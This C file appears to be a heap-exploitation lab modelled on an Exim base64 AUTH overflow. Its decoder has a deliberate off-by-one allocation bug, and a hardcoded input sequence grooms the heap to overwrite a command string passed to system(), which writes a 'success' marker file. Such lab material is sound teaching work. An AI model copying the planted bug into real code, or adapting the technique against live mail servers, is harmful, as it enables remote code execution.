#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define MAX_LINE 128

int strblocksize = MAX_LINE*4;
char *strblock;
char *action1;
char *action2;
char *action3;
char *action4;

static unsigned char dec64table[] = {
  255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255, /*  0-15 */
  255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255, /* 16-31 */
  255,255,255,255,255,255,255,255,255,255,255, 62,255,255,255, 63, /* 32-47 */
   52, 53, 54, 55, 56, 57, 58, 59, 60, 61,255,255,255,255,255,255, /* 48-63 */
  255,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, /* 64-79 */
   15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,255,255,255,255,255, /* 80-95 */
  255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, /* 96-111 */
   41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,255,255,255,255,255  /* 112-127*/
};

//slightly stripped down from original
int b64decode(char *code, char **ptr)
{
  int x, y;
  int clen = strlen(code);
  int len = 3*(clen/4) + 1;

  printf("code length: %d allocated length: %d\n", clen, len);
  char *result = malloc(len);
  *ptr = result;

  while ((x = *code++) != 0)
    {
    if (x > 127 || (x = dec64table[x]) == 255) return -1;

    y = *code++;
    if (y == 0 || (y = dec64table[y]) == 255) return -1;

    *result++ = (x << 2) | (y >> 4);

    if ((x = *code++) == '=')
      {
      if ((x = *code++) != '=') return -1;
      if ((y = *code++) != 0) return -1;
      break;
      }
    else
      {
      if (x > 127 || (x = dec64table[x]) == 255) return -1;
      *result++ = (y << 4) | (x >> 2);

      if ((y = *code++) == '=')
        {
        if ((y = *code++) != 0) return -1;
        break;
        }
      else
        {
        if (y > 127 || (y = dec64table[y]) == 255) return -1;
        *result++ = (x << 6) | y;
        }
      }
    }

  *result = 0;
  return result - *ptr;
}

//simulates loading strings from config file
void load_config() {
  strblock = malloc(strblocksize);
  action1 = &strblock[0];
  strncpy(action1, "{{First action}}", MAX_LINE);
  action2 = &strblock[MAX_LINE];
  strncpy(action2, "date", MAX_LINE); //overwrite this
  action3 = &strblock[MAX_LINE*2];
  strncpy(action3, "{{Third action}}", MAX_LINE);
  action4 = &strblock[MAX_LINE*3];
  strncpy(action4, "{{Fourth action}}", MAX_LINE);
}

#define MAX_COMMANDS 8
int prevCount = 0;
char *prevCommands[MAX_COMMANDS];

//for debug...
char *helo;
char *unk;
char *auth;

void acceptInput(char *input) {  
  size_t llen = strlen(input);
  if(llen < 3) return;
  
  char cmd = input[0];
  char *arg = &input[2];
  size_t arglen = llen - 2;
  
  printf("line len: %lu arg len: %lu\n", llen, arglen);
  
  if(cmd == 'H') { //EHLO in real world example to set hostname
      free(helo);
      helo = malloc(arglen+1);
      
      //free data for commands for previous host
      for(int i=0; i<prevCount; i++) {
        free(prevCommands[i]);
      }
      prevCount = 0;
      
      strncpy(helo, arg, arglen);
      printf("hello %s\n", helo);
  }
  else if(cmd == 'X') { //in real example RCPT command triggers evaluation for ACL check
      printf("execute %s\n", action2);
      //in real world exploit its rather a variable that's expanded
      //where there is a supported action ${run{}}' that is then 
      //handled by perl (I think) which finally executes it.
      system(action2);
  }
  else if(cmd == 'A' && prevCount < MAX_COMMANDS) { //corresponds to AUTH in real example
      int r = b64decode(arg, &auth);
      prevCommands[prevCount++] = auth;
      printf("auth %s\n", r < 0? "error" : "ok");
  }
  else if(prevCount < MAX_COMMANDS) { //in real example transformed for printing and echo'd back
      unk = prevCommands[prevCount++] = malloc(llen);
      memcpy(unk, input, llen);
      printf("unknown command\n");  
  }
}

char *lines[] = {
"H Small Hostname",
"UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU",
"H XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
"A QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQPE",
"A RkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRgAAAAAAAAAAQAAAAAAAAABGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZGRkZG",
"H Small Hostname",
"A Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQyEBAAAAAAAAgDpgAAAAAABDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0ND",

"UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU",
"A WFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhlY2hvICJzdWNjZXNzIiA+IC9ob21lL3ByaXZpbGVnZWQvaGVhcGNvcnJ1cHRpb24tbWVkaXVtAFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY",

"X xxx",
NULL };


int main(int argv, char *argc[]) {
    
  char *tmp = malloc(0x800);
  
  printf("%lx\n", (u_int64_t) tmp);
  
  load_config();
  free(tmp);
  
//  printf("%s\n",action2);  
  
//  char line[1024];
  int i=0;
  char *line = lines[i++];
  while(line != NULL) {
      acceptInput(line);
      line = lines[i++];
  }
  
//  printf("%s\n",action2);  
  
  return 0;  
}
